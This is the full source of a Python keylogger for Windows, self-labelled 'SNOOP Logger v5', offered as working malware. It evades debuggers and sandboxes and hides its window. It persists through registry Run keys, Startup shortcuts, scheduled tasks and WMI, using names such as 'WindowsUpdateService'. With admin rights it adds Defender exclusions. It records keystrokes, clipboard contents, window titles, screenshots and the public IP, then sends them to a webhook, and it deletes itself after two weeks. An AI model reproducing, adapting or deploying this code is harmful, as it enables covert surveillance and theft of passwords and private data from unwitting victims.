#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os,sys,time,json,threading,subprocess,ctypes,shutil,winreg,tempfile,logging,platform,socket,atexit,zlib,base64,random,string
from datetime import datetime
try:import requests
except:
 subprocess.check_call([sys.executable,"-m","pip","install","requests","-q"])
 import requests
try:
 from pynput import keyboard,mouse
except:
 subprocess.check_call([sys.executable,"-m","pip","install","pynput","-q"])
 from pynput import keyboard,mouse
try:import win32clipboard,win32con,win32com.client,win32security,win32api,win32file
except:
 subprocess.check_call([sys.executable,"-m","pip","install","pywin32","-q"])
 import win32clipboard,win32con,win32com.client,win32security,win32api,win32file
try:import psutil
except:
 subprocess.check_call([sys.executable,"-m","pip","install","psutil","-q"])
 import psutil
try:from cryptography.fernet import Fernet
except:
 subprocess.check_call([sys.executable,"-m","pip","install","cryptography","-q"])
 from cryptography.fernet import Fernet

WEBHOOK_URL="KEYLOGGER_WEBHOOK_PLACEHOLDER"
FALLBACK_WEBHOOKS=[]
REPORT_INTERVAL=30
STARTUP_ENABLED=True
ENCRYPT_LOGS=True
SCREENSHOT_INTERVAL=300
MAX_LOG_SIZE=1900
SELF_DESTRUCT_DAYS=14

logging.basicConfig(level=logging.ERROR)
try:ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
except:pass
try:
 if ctypes.windll.kernel32.IsDebuggerPresent():sys.exit()
 for p in psutil.process_iter():
  if p.name().lower() in ['ollydbg','x64dbg','ida','windbg','processhacker','wireshark']:sys.exit()
except:pass

def is_sandbox():
 try:
  if psutil.virtual_memory().total<4*1024**3:return True
  if psutil.disk_usage('C:').total<50*1024**3:return True
  if any(x in platform.processor().lower() for x in ['vmware','virtualbox','qemu']):return True
  if 'vbox' in open('C:\\Windows\\System32\\drivers\\etc\\hosts','r').read().lower():return True
  if len(psutil.process_iter())<30:return True
 except:pass
 return False
if is_sandbox():time.sleep(600);sys.exit(0)

def add_persistence():
 if not STARTUP_ENABLED:return
 e=sys.executable if getattr(sys,'frozen',False) else os.path.abspath(__file__)
 try:
  k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
  winreg.SetValueEx(k,"WindowsUpdateService",0,winreg.REG_SZ,f'"{e}"');winreg.CloseKey(k)
 except:pass
 try:
  s=os.path.join(os.getenv('APPDATA'),'Microsoft','Windows','Start Menu','Programs','Startup')
  if not getattr(sys,'frozen',False):
   shutil.copy2(e,os.path.join(s,'WindowsUpdateService.lnk'))
  else:
   sh=win32com.client.Dispatch("WScript.Shell");sc=sh.CreateShortCut(os.path.join(s,'WindowsUpdateService.lnk'))
   sc.TargetPath=e;sc.WorkingDirectory=os.path.dirname(e);sc.Save()
 except:pass
 try:
  subprocess.run(f'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "{e}" /sc hourly /f',shell=True,creationflags=subprocess.CREATE_NO_WINDOW,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
 except:pass
 try:
  subprocess.run(f'wmic /namespace:\\\\root\\subscription path __EventFilter create name="WindowsUpdate",eventnamespace="root\\cimv2",query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',shell=True,creationflags=subprocess.CREATE_NO_WINDOW,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
 except:pass
 try:subprocess.run(['attrib','+h','+s',e],capture_output=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except:pass

def disable_defender():
 try:
  if ctypes.windll.shell32.IsUserAnAdmin():
   subprocess.run('powershell -c "Add-MpPreference -ExclusionPath C:\\; Add-MpPreference -ExclusionPath %USERPROFILE%; Add-MpPreference -ExclusionPath %TEMP%"',shell=True,creationflags=subprocess.CREATE_NO_WINDOW,capture_output=True)
 except:pass

def self_destruct():
 try:
  if os.path.exists(sys.argv[0]) and (time.time()-os.path.getctime(sys.argv[0]))>SELF_DESTRUCT_DAYS*86400:
   b=os.path.join(os.getenv("TEMP"),"del.bat")
   with open(b,'w') as f:f.write(f'@echo off\nping 127.0.0.1 -n 5 > nul\ndel /f /q "{sys.argv[0]}"\nrmdir /s /q "{os.path.dirname(sys.argv[0])}"\ndel /f /q "%~f0"')
   subprocess.Popen(b,creationflags=subprocess.CREATE_NO_WINDOW)
   sys.exit(0)
 except:pass

keybuf="";clipcache="";lastwin="";lockf=None;fernet=None;sshot_last=0
if ENCRYPT_LOGS:
 key=Fernet.generate_key();fernet=Fernet(key)

def getwin():
 global lastwin
 try:
  u=ctypes.windll.user32;h=u.GetForegroundWindow();l=u.GetWindowTextLengthW(h)+1;b=ctypes.create_unicode_buffer(l)
  u.GetWindowTextW(h,b,l);t=b.value.strip()
  if t and t!=lastwin:lastwin=t;return f"\n[WINDOW: {t}]\n"
 except:pass
 return ""

def getclip():
 global clipcache
 if not win32clipboard:return ""
 try:
  win32clipboard.OpenClipboard()
  if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
   d=win32clipboard.GetClipboardData(win32con.CF_TEXT)
   win32clipboard.CloseClipboard()
   if d and d!=clipcache:
    clipcache=d;return f"[CLIP: {d[:200]}]\n"
  else:win32clipboard.CloseClipboard()
 except:pass
 return ""

def getsys():
 return {"host":socket.gethostname(),"user":os.getlogin(),"os":f"{platform.system()} {platform.release()}","ip":requests.get("https://api.ipify.org",timeout=3).text if requests else "N/A"}

def take_screenshot():
 try:
  from PIL import ImageGrab
 except:
  subprocess.check_call([sys.executable,"-m","pip","install","Pillow","-q"])
  from PIL import ImageGrab
  return ImageGrab.grab()
 return None

def send_raw(msg,webhook=None):
 if not webhook:webhook=WEBHOOK_URL
 payload={"username":"SNOOP Logger","avatar_url":"https://i.ibb.co/KpxXhQhm/image.png","content":msg}
 try:requests.post(webhook,json=payload,timeout=10)
 except:
  for fb in FALLBACK_WEBHOOKS:
   try:requests.post(fb,json=payload,timeout=10);break
   except:pass

def send_startup():
 s=getsys();msg=f"**[STARTUP]** Keylogger v5 on {s['host']} | {s['user']} | {s['os']} | IP: {s['ip']}"
 send_raw(msg)

def on_press(k):
 global keybuf
 w=getwin()
 if w:keybuf+=w
 c=getclip()
 if c:keybuf+=c
 try:
  if hasattr(k,'char') and k.char is not None:keybuf+=k.char
  else:
   n=str(k).replace("Key.","")
   m={"space":" ","enter":"\n[ENTER]\n","backspace":"[BS]","tab":"[TAB]","shift":"[SHIFT]","ctrl_l":"[CTRL]","ctrl_r":"[CTRL]","alt_l":"[ALT]","alt_r":"[ALT]","cmd":"[WIN]"}
   keybuf+=m.get(n,f"[{n.upper()}]")
 except:pass

def on_click(x,y,button,pressed):
 if pressed:
  if keybuf.strip():
   send_logs()
  else:
   send_raw(f"**[CLICK]** ({x},{y}) - {button} (no keys)")

def send_logs(force=False):
 global keybuf,sshot_last
 if not keybuf.strip() and not force:return
 content=""
 if keybuf.strip():
  content=keybuf[:MAX_LOG_SIZE]
  keybuf=keybuf[MAX_LOG_SIZE:] if len(keybuf)>MAX_LOG_SIZE else ""
 if datetime.now().minute%5==0:
  s=getsys();h=f"[SYS] {s['host']} | {s['user']} | {s['os']} | IP: {s['ip']}\n";content=h+content
 if ENCRYPT_LOGS and fernet and content:
  content=fernet.encrypt(content.encode()).decode()
 if time.time()-sshot_last>SCREENSHOT_INTERVAL:
  try:
   img=take_screenshot()
   if img:
    tmp=os.path.join(tempfile.gettempdir(),f"ss_{int(time.time())}.png")
    img.save(tmp)
    with open(tmp,'rb') as f:
     files={'file':(os.path.basename(tmp),f,'image/png')}
     r=requests.post(WEBHOOK_URL,files=files,timeout=15)
    os.remove(tmp)
    sshot_last=time.time()
  except:pass
 if content:
  payload={"username":"SNOOP Logger","avatar_url":"https://i.ibb.co/KpxXhQhm/image.png","content":f"```\n{content}\n```"}
  try:
   r=requests.post(WEBHOOK_URL,json=payload,timeout=10)
   if r.status_code!=204:keybuf=content+keybuf
  except:
   for fb in FALLBACK_WEBHOOKS:
    try:requests.post(fb,json=payload,timeout=10);break
    except:pass
   else:keybuf=content+keybuf

def send_loop():
 while True:
  time.sleep(REPORT_INTERVAL)
  send_logs()

def acquire_lock():
 global lockf
 p=os.path.join(tempfile.gettempdir(),"snoop_v5.lock")
 try:
  if os.path.exists(p):
   with open(p,'r') as f:pid=int(f.read().strip())
   try:os.kill(pid,0);sys.exit(0)
   except:pass
  with open(p,'w') as f:f.write(str(os.getpid()))
  lockf=p
 except:pass

def release_lock():
 if lockf and os.path.exists(lockf):
  try:os.remove(lockf)
  except:pass

def main():
 acquire_lock();atexit.register(release_lock)
 add_persistence();disable_defender();self_destruct()
 send_startup()
 threading.Thread(target=send_loop,daemon=True).start()
 with keyboard.Listener(on_press=on_press) as kl, mouse.Listener(on_click=on_click) as ml:
  kl.join();ml.join()

if __name__=="__main__":
 try:main()
 except:sys.exit(0)